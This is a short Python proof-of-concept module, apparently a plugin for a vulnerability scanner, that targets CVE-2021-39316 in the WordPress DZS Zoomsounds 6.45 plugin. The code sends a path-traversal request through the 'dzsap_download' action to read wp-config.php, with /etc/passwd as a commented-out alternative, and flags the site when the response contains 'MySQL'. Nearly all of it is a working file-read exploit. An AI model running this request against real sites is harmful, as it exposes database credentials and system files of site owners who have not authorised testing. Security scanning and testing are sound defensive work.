# coding: utf-8
import requests
import random

#WordPress Plugin DZS Zoomsounds 6.45 - Arbitrary File Read
def poc(url,user_agent,proxy):

    url = url.strip("/")
    #漏洞位置
    url=url+'/MYzoomsounds/?action=dzsap_download&link='
    # 要读取的文件
    # file = '../../../../../../../../../../etc/passwd'
    file='../../wp-config.php'
    url=url+file

    header = {'User-Agent': user_agent}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.get(url, headers=header, proxies=proxies)
    else:
        response = requests.get(url, headers=header)
    if response.status_code==200 and 'MySQL' in response.text:
        return 'WordPress Plugin DZS Zoomsounds 6.45任意文件读取漏洞存在    漏洞编号：CVE-2021-39316'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result